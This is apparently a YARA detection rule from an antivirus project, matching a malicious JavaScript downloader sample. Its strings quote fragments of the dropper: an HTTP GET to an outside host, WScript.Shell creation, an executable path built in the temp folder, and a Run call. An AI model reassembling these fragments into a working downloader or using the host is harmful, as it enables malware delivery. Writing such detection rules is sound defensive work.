rule sig_20160330_ec53b61e1be70ab799a7f78d6d98698d {
  meta:
    description = "datamaliciousorder - file 20160330_ec53b61e1be70ab799a7f78d6d98698d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "035a731e524893b75912a1d239e35343cd7b52648172513258740e5076eca1f5"

  strings:
    $s1  = "ZC[HA](\"GET\", \"http://ekotrade.pl/m4ujda\", false);" fullword ascii
    $s2  = "var XX = function H() {return WScript[TS](\"WScript\"+\".Shell\");}(), O = 11;" fullword ascii
    $s3  = "function PC(M, N){A = A * 1; return M - N;};" fullword ascii
    $s4  = "if (ZC[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function TD(){return KC + \"\";};" fullword ascii
    $s6  = "function BJ() {return XX[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"IIXE0yFqK.ex\" + \"e\";};" fullword ascii
    $s7  = "function OB() {return ((K == true) && (K == MG)) ? 1 : A;};" fullword ascii
    $s8  = "function V(L1){XX[\"Run\"](L1, A, A);};" fullword ascii
    $s9  = "var Y = new this[\"Date\"]();" fullword ascii
    $s10 = "}while (Z);" fullword ascii
    $s11 = "function H0(){return 22;};" fullword ascii
    $s12 = "return PC(B, W0);" fullword ascii
    $s13 = "function WL(MH) {var J = (1, 2, 3, 4, 5, MH); return J;};" fullword ascii
    $s14 = "function S(){return TS;};" fullword ascii
    $s15 = "function SJ()" fullword ascii
    $s16 = "K = true; " fullword ascii
    $s17 = "var K = false;" fullword ascii
    $s18 = "var MG = false;" fullword ascii
    $s19 = "var LI = false;" fullword ascii
    $s20 = "MG = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}